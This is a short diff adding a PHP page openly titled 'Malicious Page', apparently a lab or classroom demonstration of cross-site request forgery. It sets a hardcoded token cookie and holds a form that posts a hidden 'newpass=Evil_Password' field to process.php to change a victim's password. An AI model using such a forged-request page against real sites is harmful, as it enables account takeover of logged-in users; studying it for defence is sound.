@@ -1,0 +1,24 @@
+<?php
+session_start();
+$token = 547;//$_SESSION["token"];
+setCookie("tokenCookie", $token);
+
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Page</title>
+    <link rel="stylesheet" type="text/css" href="style.css">
+</head>
+<body>
+    <h1>Malicious Page</h1>
+
+    <form action="process.php" method="post">
+        <input type="hidden" name="newpass" value="Evil_Password" />
+        <input type="submit" value="Change Password to Evil_Password" />
+    </form>
+    
+</body>
+</html>
+
